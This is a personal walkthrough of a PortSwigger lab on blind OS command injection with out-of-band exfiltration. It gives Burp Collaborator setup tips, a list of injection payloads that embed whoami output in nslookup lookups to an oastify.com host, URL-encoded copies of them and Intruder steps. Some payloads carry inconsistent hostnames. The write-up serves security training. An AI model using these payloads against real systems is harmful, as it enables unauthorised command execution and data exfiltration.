# [Lab Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

<br>

## Impression:
This one was much more challenging, the difficult part was in determining the
correct meta characters to use, and in making a successful connection to the
collaborator server.

<br>

## High-level overview:
I took the steps below because the original way I solved it in the past,
as well as what is listed in the solution was not working.
If you experience the same, then this should do it.

<br>

## Steps to take:
**1st, check the collaborator health:**

**Go to Settings, look under Project, then select:** 

**Collaborator -> Run health check.**

**If you receive errors regarding a failure to connect/cetification verify, etc..**

Then check the box:

**_Poll over unencrypted HTTP_**

Run the health check again, all connection errors should now be resolved
and the collaborator should be able to accept connections from the lab

<br>

## 2nd, Sort out the correct syntax and metacharacters and URL encode every payload
This shouldn't of been an issue, but it was.

**I Created every Permutation of the command that should return the desired result:**
<br>
There is a list of all permutations below for your convienience to copy-paste.

If you encounter this issue, try this work around
the command to augment: 
```
||nslookup+`whoami`.yourcollabaddy.oastify.com||
```
<br>

**For example, use the `||`, then in the next payload, substutute the `||` with `;` and so on.**

<br>

## I then copy-pasted each one individually into the Decoder, where I URL encoded each payload, then copy-pasted this list of URL-ecoded commands, into the intruder payload list.

<br>

## Selected the email parameter as the insertion point, and left it empty
`email=§§`

Then only ran the attack, and a few moments later, received multiple
DNS queries to the collaborator, one of which was the whoami command
`peter-ZxIdda ved5g7f2zi3z3k7zv8x31928hznqbiz7 oastify com`

then just copy-paste `peter-ZxIdda` into the submit solution
and that's it, solved.

<br>

## List of cmd injection payloads I created and URL encoded for the intruder
You can use this too, just be sure to substutue the collab address here
`tjzmt1v0qk6ono8sngwirmxnw2n8ew8kx.oastify.com`
for yours

```
||nslookup+`whoami`.tjzmt1v0qk6ono8sngwirmxnw2n8ew8kx.oastify.com||
;nslookup+`whoami`.jzmt1v0qk6ono8sngwirmxnw2n8ew8kx.oastify.com;
&&nslookup+`whoami`.jzmt1v0qk6ono8sngwirmxnw2n8ew8kx.oastify.com&&
|nslookup+`whoami`.jzmt1v0qk6ono8sngwirmxnw2n8ew8kx.oastify.com|
;nslookup;+whoami;.tzw31500kgoxoisxg6i1m7n62x8owhk6.oastify.com;
;nslookup;+whoami;.jzmt1v0qk6ono8sngwirmxnw2n8ew8kx.oastify.com;
&nslookup;+whoami;.tzw31500kgoxoisxg6i1m7n62x8owhk6.oastify.com&
```

**- I believe this is the one that solved it:**
```
;nslookup;+whoami;.jzmt1v0qk6ono8sngwirmxnw2n8ew8kx.oastify.com;

```
- Notice the semicolin `;` appended to the end of the `nslookup` command
and the use of a plus sign and not a %20 to indicate a space
then the use of the semicolin again appended to th end of the `whoami` command

I have found this syntax and use of the semicolin `;` to be the most
effective/consistant way to successfully carry out command injection
exploits.
I originally discovered this when chaining Linux commands when creating aliases
in my .bashrc and .zshrc dot files



**And after URL encoding each one, your list should look like this:**
```
%7c%7c%6e%73%6c%6f%6f%6b%75%70%2b%60%77%68%6f%61%6d%69%60%2e%74%6a%7a%6d%74%31%76%30%71%6b%36%6f%6e%6f%38%73%6e%67%77%69%72%6d%78%6e%77%32%6e%38%65%77%38%6b%78%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%7c%7c%0a%0a%0a%0a%0a%0a
%7c%7c%6e%73%6c%6f%6f%6b%75%70%2b%60%77%68%6f%61%6d%69%60%2e%6a%7a%6d%74%31%76%30%71%6b%36%6f%6e%6f%38%73%6e%67%77%69%72%6d%78%6e%77%32%6e%38%65%77%38%6b%78%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%7c%7c%0a%0a%0a%0a%0a%0a%0a
%3b%6e%73%6c%6f%6f%6b%75%70%2b%60%77%68%6f%61%6d%69%60%2e%6a%7a%6d%74%31%76%30%71%6b%36%6f%6e%6f%38%73%6e%67%77%69%72%6d%78%6e%77%32%6e%38%65%77%38%6b%78%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%3b%0a%0a%0a%0a%0a%0a%0a
%26%26%6e%73%6c%6f%6f%6b%75%70%2b%60%77%68%6f%61%6d%69%60%2e%6a%7a%6d%74%31%76%30%71%6b%36%6f%6e%6f%38%73%6e%67%77%69%72%6d%78%6e%77%32%6e%38%65%77%38%6b%78%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%0a%0a%0a%0a%0a%0a%0a%0a%0a
%7c%6e%73%6c%6f%6f%6b%75%70%2b%60%77%68%6f%61%6d%69%60%2e%6a%7a%6d%74%31%76%30%71%6b%36%6f%6e%6f%38%73%6e%67%77%69%72%6d%78%6e%77%32%6e%38%65%77%38%6b%78%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%7c%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a
%3b%6e%73%6c%6f%6f%6b%75%70%3b%2b%77%68%6f%61%6d%69%3b%2e%6a%7a%6d%74%31%76%30%71%6b%36%6f%6e%6f%38%73%6e%67%77%69%72%6d%78%6e%77%32%6e%38%65%77%38%6b%78%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%3b%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a
%3b%6e%73%6c%6f%6f%6b%75%70%3b%2b%77%68%6f%61%6d%69%3b%2e%74%7a%77%33%31%35%30%30%6b%67%6f%78%6f%69%73%78%67%36%69%31%6d%37%6e%36%32%78%38%6f%77%68%6b%36%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%3b%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a
```

## Again, be sure to substutue the collab address in this example with your collab address.

## Steps to solve the lab:

**1. Paste your list of URL encoded permutated whoami with out of bounds commnds in to the Intruder payload list**

<br>

**2. Select the Attack type: Sniper**

<br>

**3. Select the email parameter for the payload position & leave it's value blank `email=§§`** 
<br>
  (this is because each payload will be injected here)
 
  <br>
  
**4. Then run the Attack**

<br>

## The End

<br>
